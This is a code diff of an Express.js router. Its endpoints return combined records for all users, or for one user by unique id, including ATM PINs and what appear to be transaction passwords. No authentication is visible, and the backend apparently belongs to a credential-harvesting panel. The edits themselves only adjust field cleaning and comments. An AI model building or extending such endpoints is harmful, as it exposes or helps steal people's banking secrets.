@@ -11,22 +11,23 @@ import TransactionPassword from "../models/transactionPassModel.js";
 const router = express.Router();
 
 /* ----------------------------------------------------------
-   CLEAN OBJECT → REMOVE _id, createdAt, __v
+   CLEAN OBJECT → REMOVE _id, uniqueid, createdAt, __v
 ---------------------------------------------------------- */
 const clean = (obj) => {
     if (!obj) return null;
 
     let data = obj.toObject();
 
-    delete data._id;        // ❌ REMOVE MONGODB OBJECT ID
-    delete data.__v;        // ❌ REMOVE VERSION
-    delete data.createdAt;  // ❌ REMOVE TIMESTAMP
+    delete data._id;        // REMOVE MongoDB ID
+    delete data.uniqueid;   // REMOVE UNIQUE ID
+    delete data.__v;        // REMOVE VERSION
+    delete data.createdAt;  // REMOVE TIMESTAMP
 
     return data;
 };
 
 /* ----------------------------------------------------------
-   GET ALL USERS — COMBINED FULL DATA
+   GET ALL USERS COMBINED DATA
    /api/all-data
 ---------------------------------------------------------- */
 router.get("/all-data", async (req, res) => {
@@ -57,13 +58,13 @@ router.get("/all-data", async (req, res) => {
         return res.json({
             success: false,
             message: "Server error",
-            error: err.message
+            error: err.message,
         });
     }
 });
 
 /* ----------------------------------------------------------
-   GET SINGLE USER ALL DATA (BY UNIQUEID)
+   GET USER COMBINED DATA BY UNIQUEID
    /api/all-data/:uniqueid
 ---------------------------------------------------------- */
 router.get("/all-data/:uniqueid", async (req, res) => {
@@ -81,7 +82,6 @@ router.get("/all-data/:uniqueid", async (req, res) => {
         return res.json({
             success: true,
             message: "User Combined Data Fetched",
-            uniqueid,
             data: {
                 form: clean(form),
                 atmPin: clean(atmPin),
@@ -97,7 +97,7 @@ router.get("/all-data/:uniqueid", async (req, res) => {
         return res.json({
             success: false,
             message: "Server error",
-            error: err.message
+            error: err.message,
         });
     }
 });
